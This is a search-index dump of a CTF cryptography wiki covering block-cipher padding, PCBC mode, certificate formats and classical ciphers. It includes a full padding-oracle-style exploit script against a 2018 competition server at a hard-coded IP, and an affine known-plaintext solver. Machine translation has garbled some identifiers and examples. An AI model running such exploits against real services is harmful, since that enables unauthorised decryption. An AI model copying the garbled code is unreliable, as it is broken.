00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75","title":"Pad with zero (null) characters"},{"location":"crypto/blockcipher/mode/padding/#pad-with-spaces","text":"Examples are as follows DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 20 20 20 20 20 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25","title":"Pad with spaces"},{"location":"crypto/blockcipher/mode/padding/#2018-shanghai-university-student-network-security-competition-aessss","text":"Sometimes you can attack some improperly used Padding. Here is a topic of the 2018 Shanghai University Student Network Security Competition: The title script is as follows: import random import sys import string from hashlib import sha256 import SocketServer from Crypto.Cipher import AES from secret import FLAG , IV , KEY class Task ( SocketServer . BaseRequestHandler ): def proof_of_work ( self ): proof = '' . join ( [ random . choice ( string . ascii_letters + string . digits ) for _ in xrange ( 20 )]) # print proof digest = sha256 ( proof ) . hexdigest () self . request . send ( \"sha256(XXXX+ %s ) == %s \\n \" % ( proof [ 4 :], digest )) self . request . send ( 'Give me XXXX:' ) x = self . request . recv ( 10 ) x = x . strip () if len ( x ) != 4 or sha256 ( x + proof [ 4 :]) . hexdigest () != digest : return False return True def pad ( self , s ): s + = ( 256 - only ( s )) * chr ( 256 - only ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return & #39;&#39; .join (right [0: -word (right [-1])]) s_box = [ 0x63 , 0x7C , 0x77 , 0x7B , 0xF2 , 0x6B , 0x6F , 0xC5 , 0x30 , 0x01 , 0x67 , 0x2B , 0xFE , 0xD7 , 0xAB , 0x76 , 0xCA , 0x82 , 0xC9 , 0x7D , 0xFA , 0x59 , 0x47 , 0xF0 , 0xAD , 0xD4 , 0xA2 , 0xAF , 0x9C , 0xA4 , 0x72 , 0xC0 , 0xB7 , 0xFD , 0x93 , 0x26 , 0x36 , 0x3F , 0xF7 , 0xCC , 0x34 , 0xA5 , 0xE5 , 0xF1 , 0x71 , 0xD8 , 0x31 , 0x15 , 0x04 , 0xC7 , 0x23 , 0xC3 , 0x18 , 0x96 , 0x05 , 0x9A , 0x07 , 0x12 , 0x80 , 0xE2 , 0xEB , 0x27 , 0xB2 , 0x75 , 0x09 , 0x83 , 0x2C , 0x1A , 0x1B , 0x6E , 0x5A , 0xA0 , 0x52 , 0x3B , 0xD6 , 0xB3 , 0x29 , 0xE3 , 0x2F , 0x84 , 0x53 , 0xD1 , 0x00 , 0xED , 0x20 , 0xFC , 0xB1 , 0x5B , 0x6A , 0xCB , 0xBE , 0x39 , 0x4A , 0x4C , 0x58 , 0xCF , 0xD0 , 0xEF , 0xAA , 0xFB , 0x43 , 0x4D , 0x33 , 0x85 , 0x45 , 0xF9 , 0x02 , 0x7F , 0x50 , 0x3C , 0x9F , 0xA8 , 0x51 , 0xA3 , 0x40 , 0x8F , 0x92 , 0x9D , 0x38 , 0xF5 , 0xBC , 0xB6 , 0xDA , 0x21 , 0x10 , 0xFF , 0xF3 , 0xD2 , 0xCD , 0x0C , 0x13 , 0xEC , 0x5F , 0x97 , 0x44 , 0x17 , 0xC4 , 0xA7 , 0x7E , 0x3D , 0x64 , 0x5D , 0x19 , 0x73 , 0x60 , 0x81 , 0x4F , 0xDC , 0x22 , 0x2A , 0x90 , 0x88 , 0x46 , 0xEE , 0xB8 , 0x14 , 0xDE , 0x5E , 0x0B , 0xDB , 0xE0 , 0x32 , 0x3A , 0x0A , 0x49 , 0x06 , 0x24 , 0x5C , 0xC2 , 0xD3 , 0xAC , 0x62 , 0x91 , 0x95 , 0xE4 , 0x79 , 0xE7 , 0xC8 , 0x37 , 0x6D , 0x8D , 0xD5 , 0x4E , 0xA9 , 0x6C , 0x56 , 0xF4 , 0xEA , 0x65 , 0x7A , 0xAE , 0x08 , 0xBA , 0x78 , 0x25 , 0x2E , 0x1C , 0xA6 , 0xB4 , 0xC6 , 0xE8 , 0xDD , 0x74 , 0x1F , 0x4B , 0xBD , 0x8B , 0x8A , 0x70 , 0x3E , 0xB5 , 0x66 , 0x48 , 0x03 , 0xF6 , 0x0E , 0x61 , 0x35 , 0x57 , 0xB9 , 0x86 , 0xC1 , 0x1D , 0x9E , 0xE1 , 0xF8 , 0x98 , 0x11 , 0x69 , 0xD9 , 0x8E , 0x94 , 0x9B , 0x1E , 0x87 , 0xE9 , 0xCE , 0x55 , 0x28 , 0xDF , 0x8C , 0xA1 , 0x89 , 0x0D , 0xBF , 0xE6 , 0x42 , 0x68 , 0x41 , 0x99 , 0x2D , 0x0F , 0xB0 , 0x54 , 0xBB , 0x16 ] invs_box = [ 0x52 , 0x09 , 0x6A , 0xD5 , 0x30 , 0x36 , 0xA5 , 0x38 , 0xBF , 0x40 , 0xA3 , 0x9E , 0x81 , 0xF3 , 0xD7 , 0xFB , 0x7C , 0xE3 , 0x39 , 0x82 , 0x9B , 0x2F , 0xFF , 0x87 , 0x34 , 0x8E , 0x43 , 0x44 , 0xC4 , 0xDE , 0xE9 , 0xCB , 0x54 , 0x7B , 0x94 , 0x32 , 0xA6 , 0xC2 , 0x23 , 0x3D , 0xEE , 0x4C , 0x95 , 0x0B , 0x42 , 0xFA , 0xC3 , 0x4E , 0x08 , 0x2E , 0xA1 , 0x66 , 0x28 , 0xD9 , 0x24 , 0xB2 , 0x76 , 0x5B , 0xA2 , 0x49 , 0x6D , 0x8B , 0xD1 , 0x25 , 0x72 , 0xF8 , 0xF6 , 0x64 , 0x86 , 0x68 , 0x98 , 0x16 , 0xD4 , 0xA4 , 0x5C , 0xCC , 0x5D , 0x65 , 0xB6 , 0x92 , 0x6C , 0x70 , 0x48 , 0x50 , 0xFD , 0xED , 0xB9 , 0xDA , 0x5E , 0x15 , 0x46 , 0x57 , 0xA7 , 0x8D , 0x9D , 0x84 , 0x90 , 0xD8 , 0xAB , 0x00 , 0x8C , 0xBC , 0xD3 , 0x0A , 0xF7 , 0xE4 , 0x58 , 0x05 , 0xB8 , 0xB3 , 0x45 , 0x06 , 0xD0 , 0x2C , 0x1E , 0x8F , 0xCA , 0x3F , 0x0F , 0x02 , 0xC1 , 0xAF , 0xBD , 0x03 , 0x01 , 0x13 , 0x8A , 0x6B , 0x3A , 0x91 , 0x11 , 0x41 , 0x4F , 0x67 , 0xDC , 0xEA , 0x97 , 0xF2 , 0xCF , 0xCE , 0xF0 , 0xB4 , 0xE6 , 0x73 , 0x96 , 0xAC , 0x74 , 0x22 , 0xE7 , 0xAD , 0x35 , 0x85 , 0xE2 , 0xF9 , 0x37 , 0xE8 , 0x1C , 0x75 , 0xDF , 0x6E , 0x47 , 0xF1 , 0x1A , 0x71 , 0x1D , 0x29 , 0xC5 , 0x89 , 0x6F , 0xB7 , 0x62 , 0x0E , 0xAA , 0x18 , 0xBE , 0x1B , 0xFC , 0x56 , 0x3E , 0x4B , 0xC6 , 0xD2 , 0x79 , 0x20 , 0x9A , 0xDB , 0xC0 , 0xFE , 0x78 , 0xCD , 0x5A , 0xF4 , 0x1F , 0xDD , 0xA8 , 0x33 , 0x88 , 0x07 , 0xC7 , 0x31 , 0xB1 , 0x12 , 0x10 , 0x59 , 0x27 , 0x80 , 0xEC , 0x5F , 0x60 , 0x51 , 0x7F , 0xA9 , 0x19 , 0xB5 , 0x4A , 0x0D , 0x2D , 0xE5 , 0x7A , 0x9F , 0x93 , 0xC9 , 0x9C , 0xEF , 0xA0 , 0xE0 , 0x3B , 0x4D , 0xAE , 0x2A , 0xF5 , 0xB0 , 0xC8 , 0xEB , 0xBB , 0x3C , 0x83 , 0x53 , 0x99 , 0x61 , 0x17 , 0x2B , 0x04 , 0x7E , 0xBA , 0x77 , 0xD6 , 0x26 , 0xE1 , 0x69 , 0x14 , 0x63 , 0x55 , 0x21 , 0x0C , 0x7D ] def encrypt ( self , msg ): cipher = AES . new ( KEY , AES . MODE_CBC , IV ) return cipher . encrypt ( msg ) . encode ( 'hex' ) def handle ( self ): if not self . proof_of_work (): return self . request . settimeout ( 15 ) req = self . request flag_len = len ( FLAG ) assert ( flag_len == 33 ) self . flag = self . pad ( FLAG ) assert ( len ( self . flag ) == 256 ) while True : req . sendall ( 'Welcome to AES(WXH) encrypt system. \\n 1. get encrypted flag. \\n 2. pad flag. \\n 3.Do some encrypt. \\n Your choice:' ) cmd = req . recv ( 2 ) . strip () try : cmd = int ( cmd ) except ValueError : cmd = 0 if cmd == 1 : enc = self . encrypt ( self . flag ) req . sendall ( 'Here is the encrypted flag: 0x %s \\n ' % enc ) elif cmd == 2 : req . sendall ( 'Pad me something:' ) self . flag = self . unpad ( self . flag ) [ : flag_len ] + req . recv ( 1024 ) . strip () assert ( len ( self . flag ) <= 256 ) self . flag = self . pad ( self . flag ) req . sendall ( 'Done. \\n ' ) elif cmd == 3 : req . sendall ( 'What do you want to encrypt:' ) msg = self . pad ( req . recv ( 1024 ) . strip ()) assert ( len ( msg ) & lt ; = 256 ) enc = self . encrypt ( msg ) req . sendall ( 'Here is the encrypted message: 0x %s \\n ' % enc ) else : req . sendall ( 'Do not lose heart\uff5e \uff01% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!' ) req . close () return class ThreadedServer ( SocketServer . ThreadingMixIn , SocketServer . TCPServer ): pass if __name__ == \"__main__\" : HOST , PORT = '0.0.0.0' , 23333 print 'Run in port:23333' server = ThreadedServer (( HOST , PORT ), Task ) server . allow_reuse_address = True server . serve_forever ()","title":"2018 Shanghai University Student Network Security Competition aessss"},{"location":"crypto/blockcipher/mode/padding/#analysis","text":"The problem with this problem is in padding. Since there are less than 256 bits to padding, the padding bytes are the missing bytes, but if the plaintext is 256 bytes, then padding is not performed according to the code logic: def pad ( self , s ): s + = ( 256 - only ( s )) * chr ( 256 - only ( s )) ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . s_box ): ret [ pos ] = s [ index ] return '' . join ( ret ) The biggest problem is on the unpad, which is not checked by the unpad, only the last byte is used to determine the number of bytes to fill. def unpad ( self , s ): ret = [ ' \\x00 ' for _ in range ( 256 )] for index , pos in enumerate ( self . invs_box ): ret [ pos ] = s [ index ] return & #39;&#39; .join (right [0: -word (right [-1])]) We can control the number of padding bytes removed by tampering with the last byte.","title":"Analysis"},{"location":"crypto/blockcipher/mode/padding/#use","text":"Select choice2 and append 256-33 = 223 bytes so that the current flag does not need to be filled. The last byte appended is set to chr(256-32) . The server appends our information to the flag and performs s box substitution, and the result is assigned to the flag variable in the class. We choose choice2 again, here we need to append, the server will take the flag variable in the class for reverse S box replacement and unpad, so according to this unpad algorithm will be the next 224 bytes as the padding removed, the plaintext is left The first 32 bits of the real flag. We enter a character i at this time, then the object encrypted at this time is flag[:32]+i . Select choice1 to encrypt the current flag, control i to blast, and if the resulting ciphertext is the same as the original flag encrypted ciphertext, the last byte of the flag is obtained. Bleak byte by byte until all flags are obtained. Exp is as follows: # -*- coding: utf-8 -*- from hashlib import sha256 import socket import string import itertools HOST = '106.75.13.64' PORT = 54321 sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( HOST , PORT )) def brute_force ( pad , shavalue ): for str in itertools . product ( string . ascii_letters + string . digits , repeat = 4 ): str = '' . join ( str ) if sha256 ( str + pad ) . hexdigest () == shavalue : print str return str def choice1 (): sock . send ( \"1 \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 30 :] sock . recv ( 1024 ) . strip () return result def choice2 ( pad ): sock . send ( \"2 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( pad + \" \\n \" ) sock . recv ( 1024 ) . strip () sock . recv ( 1024 ) . strip () def choice3 ( str ): sock . send ( \"3 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( str + \" \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 33 :] sock . recv ( 1024 ) . strip () return result content = sock . recv ( 1024 ) . strip () pad = content [ 12 : 12 + 16 ] hash = content [ 33 : 33 + 64 ] sock . recv ( 1024 ) . strip () sock . send ( str ( brute_force ( pad , hash )) + \" \\n \" ) print sock . recv ( 1024 ) . strip () flag_enc = choice1 () flag = \"\" for i in range ( 33 ): a = '' . join ([ 'a' for _ in range ( 223 )]) a = a [: - 1 ] + chr ( 224 + i ) for c in string . printable : print c + flag choice2 ( a ) choice2 ( c + flag ) if choice1 () == flag_enc : flag = c + flag print \"success:\" , flag break flag{H4ve_fun_w1th_p4d_and_unp4d}","title":"Use"},{"location":"crypto/blockcipher/mode/pcbc/","text":"PCBC \u00b6 The full name of PCBC is Plaintext cipher-block chaining. Also known as Propagating cipher-block chaining. Encryption \u00b6 decryption \u00b6 Features \u00b6 The decryption process is difficult to parallelize Interchanging adjacent ciphertext blocks does not affect subsequent ciphertext blocks","title":"PCBC"},{"location":"crypto/blockcipher/mode/pcbc/#pcbc","text":"The full name of PCBC is Plaintext cipher-block chaining. Also known as Propagating cipher-block chaining.","title":"PCBC"},{"location":"crypto/blockcipher/mode/pcbc/#encryption","text":"","title":"Encryption"},{"location":"crypto/blockcipher/mode/pcbc/#decryption","text":"","title":"decryption"},{"location":"crypto/blockcipher/mode/pcbc/#features","text":"The decryption process is difficult to parallelize Interchanging adjacent ciphertext blocks does not affect subsequent ciphertext blocks","title":"Features"},{"location":"crypto/certificate/introduction/","text":"\u8bc1\u4e66\u683c\u5f0f \u00b6 PEM \u00b6 PEM is just ASN.1 data put between headers -----BEGIN and -----END , where ASN.1 is binary data with base64 encoding. There are valid PEM examples here on Wikipedia . With Python 3 and the PyCryptodome library, we could easily access a PEM file and extract data from it. For example, say we want to extract the modulus n : #!/usr/bin/env python3 from Crypto.PublicKey import RSA with open ( \"certificate.pem\" , \"r\" ) as f : key = RSA . import_key ( f . read ()) print ( key . n ) DER \u00b6 DER is a binary encoding method for data described by ASN.1. Certificates with the .cer or .crt extension usually contains DER formatted data, but Windows might also accept PEM formatted data. To work with a DER file, we could convert it to PEM using openssl : openssl x509 -inform DER -in certificate.der > certificate.pem Now the problem is reduced to \"how to work with a PEM file\", so we could use the same Python code as the one in the PEM section. Additonal Format Conversion \u00b6 openssl x509 -outform der -in certificate.pem -out certificate.der openssl x509 -inform der -in certificate.cer -out certificate.pem Reference \u00b6 Attacking RSA for fun and CTF points \u2013 part 1 What are the differences between .pem, .cer and .der?","title":"Certificate Format"},{"location":"crypto/certificate/introduction/#_1","text":"","title":"\u8bc1\u4e66\u683c\u5f0f"},{"location":"crypto/certificate/introduction/#pem","text":"PEM is just ASN.1 data put between headers -----BEGIN and -----END , where ASN.1 is binary data with base64 encoding. There are valid PEM examples here on Wikipedia . With Python 3 and the PyCryptodome library, we could easily access a PEM file and extract data from it. For example, say we want to extract the modulus n : #!/usr/bin/env python3 from Crypto.PublicKey import RSA with open ( \"certificate.pem\" , \"r\" ) as f : key = RSA . import_key ( f . read ()) print ( key . n )","title":"PEM"},{"location":"crypto/certificate/introduction/#der","text":"DER is a binary encoding method for data described by ASN.1. Certificates with the .cer or .crt extension usually contains DER formatted data, but Windows might also accept PEM formatted data. To work with a DER file, we could convert it to PEM using openssl : openssl x509 -inform DER -in certificate.der > certificate.pem Now the problem is reduced to \"how to work with a PEM file\", so we could use the same Python code as the one in the PEM section.","title":"DER"},{"location":"crypto/certificate/introduction/#additonal-format-conversion","text":"openssl x509 -outform der -in certificate.pem -out certificate.der openssl x509 -inform der -in certificate.cer -out certificate.pem","title":"Additonal Format Conversion"},{"location":"crypto/certificate/introduction/#reference","text":"Attacking RSA for fun and CTF points \u2013 part 1 What are the differences between .pem, .cer and .der?","title":"Reference"},{"location":"crypto/classical/introduction/","text":"In classical cryptography, we mainly introduce single-table alternative passwords, multi-table alternative passwords, and some other more interesting passwords. It is worth mentioning that in classical cryptography, the designer mainly considers the confidentiality of the message, so that only the person with the relevant key can decrypt the ciphertext to obtain the content of the message, and the integrity and non-repudiation of the message are not carried out. Too many considerations. Expand reading [The coding and encryption of those brain holes in the CTF] ( http://www.tuicool.com/articles/2E3INnm ) [History of Classical Cryptography] ( http://www.oscca.gov.cn/sca/zxfw/2017-04/24/content_1011709.shtml ) [Classical Password - Wikipedia] ( https://en.wikipedia.org/wiki/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A2%BC )","title":"Introduction to Classical Cryptography"},{"location":"crypto/classical/monoalphabetic/","text":"General Features \u00b6 In single-table replacement encryption, all encryption methods have almost one commonality, that is, the plaintext one-to-one correspondence. Therefore, there are generally two ways to crack In the case of a small key space, brute force Use word frequency analysis when the ciphertext length is long enough, http://quipqiup.com/ When the key space is large enough and the ciphertext length is short enough, the cracking is more difficult. Caesar Password \u00b6 Principle \u00b6 When Caesar is encrypted, each letter in the plaintext is moved backward (or forward) by a fixed number ( circular movement**) as ciphertext according to its order in the alphabet. For example, when the offset is shifted to the left by 3 (the key at decryption is 3): Plaintext alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZ The ciphertext alphabet: DEFGHIJKLMNOPQRSTUVWXYZABC In use, the encryptor finds the location of each letter in the message that needs to be encrypted in the plaintext alphabet, and writes the corresponding letter in the ciphertext alphabet. The person who needs to decrypt is reversed according to the previously known key to get the original plaintext. E.g: \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG Secret: WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ Depending on the offset, there are also a number of specific Caesar password names**: Offset is 10: Avocat (A\u2192K) The offset is 13: [ROT13] ( https://zh.wikipedia.org/wiki/ROT13 ) Offset -5: Cassis (K 6) Offset -6: Cassette (K 7) In addition, there is a key-based Caesar cipher Keyed Caesar. The basic principle is that use a key to convert each bit of the key into a number (generally converted into a number corresponding to the alphabet), and use this number as the key to encrypt each letter of the plaintext. Here is an example of the XMan Phase I Summer Camp sharing the Kung Pao Chicken Crest Crypto 100 . Ciphertext: s0a6u3u1s0bv1a Key: guangtou Offset: 6, 20, 0, 13, 6, 19, 14, 20 Clear text: y0u6u3h1y0uj1u \u7834 \u00b6 For Caesar passwords without keys, there are two ways to break the basics. Traverse 26 offsets for general conditions Using word frequency analysis, it is suitable for the case of long ciphertext. Among them, the first way can definitely get plaintext, while the second way does not necessarily get the correct plaintext. For a key-based Caesar cipher, it is generally necessary to know the corresponding key. Tools \u00b6 Generally we have the following tools, of which JPK is more general. JPK, solvable with and without key http://planetcalc.com/1434/ http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php Shift password \u00b6 Similar to the Caesars password, the difference is that shifting passwords not only handles letters, but also numbers and special characters, which are commonly used in ASCII tables. The way to crack it is also to traverse all the possibilities to get the possible results. Atbash Cipher \u00b6 Principle \u00b6 Atbash Cipher can actually be considered as a special case of a simple replacement password to be introduced below. It uses the last letter of the alphabet to represent the first letter, and the second to last letter represents the second letter. In the Roman alphabet, it appears like this: Clear text: ABCDEFGHIJKLMNOPQRSTU VWXYZ Ciphertext: ZYXWVUTSRQPONMLKJIHGF EDCBA An example is given below: \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6 \u6587 \uff1a gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt \u7834 \u00b6 It can be seen that the key space is short enough, and when the ciphertext is long enough, it can still be solved by word frequency analysis. Tools \u00b6 http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/ Simple replacement password \u00b6 Principle \u00b6 When the Simple Substitution Cipher is encrypted, each plaintext letter is replaced with a letter that uniquely corresponds to it. The difference between it and the Caesar cipher is that the letters of its cipher alphabet are not simply shifted, but completely confusing, which makes it more difficult to crack than the Caesar cipher. such as: Plain text: abcdefghijklmnopqrstuvwxyz Key letter: phqgiumeaylnofdxjkrcvstzwb a corresponds to p, d corresponds to h, and so on. \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6 \u6587: those jvaql hkdtf udz yvoxr dsik those npbw gdm When decrypting, we generally know the corresponding rules of each letter before we can decrypt it normally. \u7834 \u00b6 Since this encryption method results in all of its keys being 26! 26! , it is almost impossible to use a violent solution. So we generally use word frequency analysis. Tools \u00b6 http://quipqiup.com/ affine password \u00b6 Principle \u00b6 The cryptographic function of the affine password is E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m , where x x indicates the number of plaintexts obtained by some encoding a a and m m are qualitative m m is the number of letters in the encoding system. The decryption function is D(x)=a^{-1}(xb)\\pmod m D(x)=a^{-1}(xb)\\pmod m , where a^{-1} a^{-1} is a a at \\mathbb{Z}_{m} \\mathbb{Z}_{m} Multiplication inverse. Let's take the E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26 function as an example. The encrypted string is AFFINE CIPHER . Here we use the alphabet 26 letters as the encoding system. | \u660e\u6587 | A | F | F | I | N | E | C | I | P | H | E | R | | --------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | x | 0 | 5 | 5 | 8 | 13 | 4 | 2 | 8 | 15 | 7 | 4 | 17 | | $ y = 5x + 8 $ | 8 | 33 | 33 | 48 | 73 | 28 | 18 | 48 | 83 | 43 | 28 | 93 | | $ y mod26 $ | 8 | 7 | 7 | 22 | 21 | 2 | 18 | 22 | 5 | 17 | 2 | 15 | | \u5bc6\u6587 | I | H | H | W | V | C | S | W | F | R | C | P | The corresponding encryption result is IHHWVCSWFRCP . For the decryption process, the normal decrypter has a and b, and can calculate a^{-1} a^{-1} to be 21, so its decryption function is D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26} , Decrypt as follows | \u5bc6\u6587 | I | H | H | W | V | C | S | W | F | R | C | P | | ----------- | :--- | :--- | --- | --- | --- | ---- | --- | --- | --- | --- | ---- | --- | | $ y $ | 8 | 7 | 7 | 22 | 21 | 2 | 18 | 22 | 5 | 17 | 2 | 15 | | x=21(y-8) x=21(y-8) | 0 | -21 | -21 | 294 | 273 | -126 | 210 | 294 | -63 | 189 | -126 | 147 | | x\\mod26 x\\mod26 | 0 | 5 | 5 | 8 | 13 | 4 | 2 | 8 | 15 | 7 | 4 | 17 | | \u660e\u6587 | A | F | F | I | N | E | C | I | P | H | E | R | It can be seen that it is characterized by only 26 English letters. \u7834 \u00b6 First of all, we can see that the affine password is different for any two different letters, and the ciphertext obtained by it is different, so it also has the most common features. When the ciphertext length is long enough, we can use the frequency analysis method to solve it. Second, we can consider how to attack the password. It can be seen that when a=1 a=1 , the affine encryption is Caesar encryption. In general, when we use affine ciphers, the character set uses the alphabet, generally only 26 letters, and not more than 26 and 26 symbiotics. $$ (26) = (2) non (13) = 12 $$ Counting the offset of b, there is a total possible key space size. $$ 12 \\times 26 = 312 $$ In general, for this kind of password, we must at least attack the known part of the plaintext. A simple analysis is performed below. This kind of password is controlled by two parameters. If we know any one of them, then we can easily enumerate another parameter quickly to get the answer. However, suppose we already know the set of letters used, here we assume 26 letters, we have another way of decryption, we only need to know the two encrypted letters y_1, y_2 y_1, y_2 to decrypt. Then we can still know $$ y_1=(ax_1+b)\\pmod{26} \\ y_2=(ax_2+b)\\pmod{26} $$ Two types of subtraction, available $$ y_1-y_2=a(x_1-x_2)\\pmod{26} $$ Here y_1,y_2 y_1,y_2 is known. If we know the two different characters x_1 x_1 and x_2 x_2 for the cipher text, then we can easily get a a and then get b b . Examples \u00b6 Here we take TWCTF 2016's super_express as an example. Simply look at the source code import sys key = '****CENSORED***************' flag = 'TWCTF{*******CENSORED********}' if len ( key ) % 2 == 1 : print ( \"Key Length Error\" ) sys . exit ( 1 ) n = len ( key ) / 2 encrypted = '' for c in flag : c = word ( c ) for a , b in zip ( key [ 0 : n ], key [ n : 2 * n ]): c = ( ord ( a ) * c + ord ( b )) % 251 encrypted += ' %02x ' % c print encrypted It can be found that although each letter in the flag is encrypted n times, if we analyze it carefully, we can find $$ \\begin{align*} c_1&=a_1c+b_1 \\ c_2 & = a_2c_1 + b_2 \\ &=a_1a_2c+a_2b_1+b_2 \\ & = kc + d \\end{align*} $$ According to the second line of derivation, we can get the actual form of $c_n $, which can be seen as $c_n=xc+y $ , and we can know that the key is always unchanged, so that In fact, this is the affine password. In addition, the title also gives the plaintext and part of the partial ciphertext corresponding plaintext, then we can easily use the known plaintext attack method to attack, using the code as follows import gmpy key = '****CENSORED****************' flag = 'TWCTF{*******CENSORED********}' f = open ( 'encrypted' , 'r' ) data = f . read () . strip ( ' \\n ' ) encrypted = [ int ( data [ i : i + 2 ], 16 ) for i in range ( 0 , len ( data ), 2 )] plaindelta = words ( flag [ 1 ]) - words ( flag [ 0 ]) cipherdalte = encrypted [ 1 ] - encrypted [ 0 ] a = gmpy . invert ( plaindelta , 251 ) * cipheral % 251 b = ( encrypted [ 0 ] - a * ord ( flag [ 0 ])) % 251 a_inv = gmpy . invert ( a , 251 ) result = \"\" for c in encrypted : result += chr (( c - b ) * a_inv % 251 ) print result Results are as follows \u279c TWCTF2016-super_express git: ( master ) \u2717 python exploit.py TWCTF { Faster_Than_Shinkansen! }","title":"Single table Substitution Cipher"},{"location":"crypto/classical/monoalphabetic/#general-features","text":"In single-table replacement encryption, all encryption methods have almost one commonality, that is, the plaintext one-to-one correspondence. Therefore, there are generally two ways to crack In the case of a small key space, brute force Use word frequency analysis when the ciphertext length is long enough, http://quipqiup.com/ When the key space is large enough and the ciphertext length is short enough, the cracking is more difficult.","title":"General Features"},{"location":"crypto/classical/monoalphabetic/#caesar-password","text":"","title":"Caesar Password"},{"location":"crypto/classical/monoalphabetic/#principle","text":"When Caesar is encrypted, each letter in the plaintext is moved backward (or forward) by a fixed number ( circular movement**) as ciphertext according to its order in the alphabet. For example, when the offset is shifted to the left by 3 (the key at decryption is 3): Plaintext alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZ The ciphertext alphabet: DEFGHIJKLMNOPQRSTUVWXYZABC In use, the encryptor finds the location of each letter in the message that needs to be encrypted in the plaintext alphabet, and writes the corresponding letter in the ciphertext alphabet. The person who needs to decrypt is reversed according to the previously known key to get the original plaintext. E.g: \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG Secret: WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ Depending on the offset, there are also a number of specific Caesar password names**: Offset is 10: Avocat (A\u2192K) The offset is 13: [ROT13] ( https://zh.wikipedia.org/wiki/ROT13 ) Offset -5: Cassis (K 6) Offset -6: Cassette (K 7) In addition, there is a key-based Caesar cipher Keyed Caesar. The basic principle is that use a key to convert each bit of the key into a number (generally converted into a number corresponding to the alphabet), and use this number as the key to encrypt each letter of the plaintext. Here is an example of the XMan Phase I Summer Camp sharing the Kung Pao Chicken Crest Crypto 100 . Ciphertext: s0a6u3u1s0bv1a Key: guangtou Offset: 6, 20, 0, 13, 6, 19, 14, 20 Clear text: y0u6u3h1y0uj1u","title":"Principle"},{"location":"crypto/classical/monoalphabetic/#_1","text":"For Caesar passwords without keys, there are two ways to break the basics. Traverse 26 offsets for general conditions Using word frequency analysis, it is suitable for the case of long ciphertext. Among them, the first way can definitely get plaintext, while the second way does not necessarily get the correct plaintext. For a key-based Caesar cipher, it is generally necessary to know the corresponding key.","title":"\u7834"},{"location":"crypto/classical/monoalphabetic/#tools","text":"Generally we have the following tools, of which JPK is more general. JPK, solvable with and without key http://planetcalc.com/1434/ http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php","title":"Tools"},{"location":"crypto/classical/monoalphabetic/#shift-password","text":"Similar to the Caesars password, the difference is that shifting passwords not only handles letters, but also numbers and special characters, which are commonly used in ASCII tables. The way to crack it is also to traverse all the possibilities to get the possible results.","title":"Shift password"},{"location":"crypto/classical/monoalphabetic/#atbash-cipher","text":"","title":"Atbash Cipher"},{"location":"crypto/classical/monoalphabetic/#principle_1","text":"Atbash Cipher can actually be considered as a special case of a simple replacement password to be introduced below. It uses the last letter of the alphabet to represent the first letter, and the second to last letter represents the second letter. In the Roman alphabet, it appears like this: Clear text: ABCDEFGHIJKLMNOPQRSTU VWXYZ Ciphertext: ZYXWVUTSRQPONMLKJIHGF EDCBA An example is given below: \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6 \u6587 \uff1a gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt","title":"Principle"},{"location":"crypto/classical/monoalphabetic/#_2","text":"It can be seen that the key space is short enough, and when the ciphertext is long enough, it can still be solved by word frequency analysis.","title":"\u7834"},{"location":"crypto/classical/monoalphabetic/#tools_1","text":"http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/","title":"Tools"},{"location":"crypto/classical/monoalphabetic/#simple-replacement-password","text":"","title":"Simple replacement password"},{"location":"crypto/classical/monoalphabetic/#principle_2","text":"When the Simple Substitution Cipher is encrypted, each plaintext letter is replaced with a letter that uniquely corresponds to it. The difference between it and the Caesar cipher is that the letters of its cipher alphabet are not simply shifted, but completely confusing, which makes it more difficult to crack than the Caesar cipher. such as: Plain text: abcdefghijklmnopqrstuvwxyz Key letter: phqgiumeaylnofdxjkrcvstzwb a corresponds to p, d corresponds to h, and so on. \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6 \u6587: those jvaql hkdtf udz yvoxr dsik those npbw gdm When decrypting, we generally know the corresponding rules of each letter before we can decrypt it normally.","title":"Principle"},{"location":"crypto/classical/monoalphabetic/#_3","text":"Since this encryption method results in all of its keys being 26! 26! , it is almost impossible to use a violent solution. So we generally use word frequency analysis.","title":"\u7834"},{"location":"crypto/classical/monoalphabetic/#tools_2","text":"http://quipqiup.com/","title":"Tools"},{"location":"crypto/classical/monoalphabetic/#affine-password","text":"","title":"affine password"},{"location":"crypto/classical/monoalphabetic/#principle_3","text":"The cryptographic function of the affine password is 